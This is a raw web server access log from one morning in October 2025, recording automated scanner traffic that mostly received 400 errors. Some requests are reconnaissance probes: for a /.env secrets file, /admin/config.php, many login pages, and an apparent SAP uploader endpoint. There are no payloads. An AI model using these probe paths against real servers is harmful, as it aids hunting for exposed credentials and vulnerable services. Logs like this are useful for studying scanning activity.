216.180.246.41 - - [19/Oct/2025:03:37:26 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.41 - - [19/Oct/2025:03:40:32 +0000] "GET /login.htm HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.41 - - [19/Oct/2025:03:43:20 +0000] "GET /login.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.41 - - [19/Oct/2025:03:46:06 +0000] "GET /login.jsp HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
162.62.132.25 - - [19/Oct/2025:03:46:09 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
216.180.246.41 - - [19/Oct/2025:03:49:24 +0000] "GET /login HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.41 - - [19/Oct/2025:03:52:33 +0000] "GET /doc/index.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.41 - - [19/Oct/2025:03:55:03 +0000] "GET /remote/login HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.41 - - [19/Oct/2025:03:57:27 +0000] "GET //admin/login.asp HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.41 - - [19/Oct/2025:03:59:29 +0000] "GET /web/ HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.41 - - [19/Oct/2025:04:03:05 +0000] "GET //webpages/login.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
34.140.71.81 - - [19/Oct/2025:04:03:18 +0000] "GET / HTTP/1.1" 400 154 "-" "python-requests/2.32.5" "-"
199.45.154.114 - - [19/Oct/2025:04:13:34 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
199.45.154.114 - - [19/Oct/2025:04:13:46 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
199.45.154.114 - - [19/Oct/2025:04:13:53 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
199.45.154.114 - - [19/Oct/2025:04:13:54 +0000] "GET /.well-known/security.txt HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
149.130.217.176 - - [19/Oct/2025:04:29:22 +0000] "GET / HTTP/1.1" 400 154 "-" "python-httpx/0.28.1" "-"
87.121.84.17 - - [19/Oct/2025:04:48:30 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
204.76.203.219 - - [19/Oct/2025:05:07:36 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
144.172.103.124 - - [19/Oct/2025:05:34:23 +0000] "GET / HTTP/1.0" 400 143 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" "-"
20.64.105.186 - - [19/Oct/2025:06:00:01 +0000] "GET /developmentserver/metadatauploader HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
87.121.84.17 - - [19/Oct/2025:06:15:20 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
85.142.100.143 - - [19/Oct/2025:06:18:43 +0000] "GET / HTTP/1.0" 400 143 "-" "Mozilla/5.0 (compatible; CyberOKInspect/1.0; +https://www.cyberok.ru/policy.html)" "-"
107.172.156.160 - - [19/Oct/2025:06:25:14 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
107.172.156.160 - - [19/Oct/2025:06:25:14 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
43.166.244.66 - - [19/Oct/2025:06:58:49 +0000] "GET / HTTP/1.1" 200 400 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
204.76.203.219 - - [19/Oct/2025:07:07:17 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
103.105.208.136 - - [19/Oct/2025:07:23:30 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
194.163.129.51 - - [19/Oct/2025:07:32:07 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "xfa1" "-"
206.81.0.195 - - [19/Oct/2025:07:50:29 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0" "-"
206.81.0.195 - - [19/Oct/2025:07:50:29 +0000] "GET /favicon.ico HTTP/1.1" 400 154 "http://3.149.120.21/" "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0" "-"
43.133.138.23 - - [19/Oct/2025:08:01:26 +0000] "GET / HTTP/1.1" 400 154 "-" "python-requests/2.32.5" "-"
43.133.138.23 - - [19/Oct/2025:08:01:27 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Linux; Android 10; Pixel Build/QP1A.190711.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36" "-"
